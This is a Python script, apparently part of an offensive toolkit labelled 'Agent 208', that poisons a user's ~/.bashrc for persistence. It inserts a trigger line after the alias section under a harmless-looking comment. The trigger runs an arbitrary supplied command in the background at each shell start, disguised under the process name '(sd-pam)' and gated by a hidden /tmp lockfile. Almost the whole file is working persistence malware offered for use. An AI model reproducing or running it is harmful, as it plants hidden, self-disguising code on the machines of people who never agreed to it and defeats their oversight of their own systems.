#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import random
import string
import re

class BashrcPoisoner:
    """
    Agent 208: User-Session Persistence.
    Injects a background trigger into .bashrc that executes 
    whenever a user starts an interactive shell session.
    """
    def __init__(self, payload_cmd):
        self.payload = payload_cmd
        self.target_path = os.path.expanduser("~/.bashrc")

    def _generate_trigger(self):
        """Generates a stealthy, renamed background trigger."""
        lock_id = ''.join(random.choice(string.ascii_lowercase) for _ in range(4))
        lock_file = f"/tmp/.cache-v-{lock_id}"
        
        # We masquerade as a 'systemd --user' helper
        proc_name = "(sd-pam)"
        
        # Only run if the lockfile doesn't exist for this session
        return f'[ ! -f {lock_file} ] && {{ (bash -c "exec -a \\"{proc_name}\\" {self.payload}") >/dev/null 2>&1 & touch {lock_file}; }}'

    def execute(self):
        print(f"--- [AGENT 208: BASHRC SESSION POISONING] ---")
        
        if not os.path.exists(self.target_path):
            print(f"[!] Target {self.target_path} not found. Creating it...")
            with open(self.target_path, 'w') as f:
                f.write("# .bashrc\n")

        try:
            trigger = self._generate_trigger()
            
            # Read file to find a good injection point (after aliases)
            with open(self.target_path, 'r') as f:
                content = f.read()
                if self.payload[:15] in content:
                    print("[+] Payload already exists in .bashrc. Skipping.")
                    return True

            # Stealth Strategy: We look for the 'alias' section and hide there
            # If no aliases, we just append to the end.
            lines = content.splitlines()
            alias_indices = [i for i, line in enumerate(lines) if line.strip().startswith('alias')]
            
            if alias_indices:
                insertion_point = alias_indices[-1] + 1
                lines.insert(insertion_point, f"\n# User specific aliases and functions\n{trigger}")
                new_content = "\n".join(lines)
            else:
                new_content = content + f"\n\n# Terminal check-in\n{trigger}\n"

            with open(self.target_path, 'w') as f:
                f.write(new_content)
            
            print(f"[!!!] POISONING SUCCESSFUL: Trigger hidden in {self.target_path}")
            return True
        except Exception as e:
            print(f"[!] Poisoning Failed: {e}")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py '<command_to_run>'")
        sys.exit(1)
    
    BashrcPoisoner(sys.argv[1]).execute()
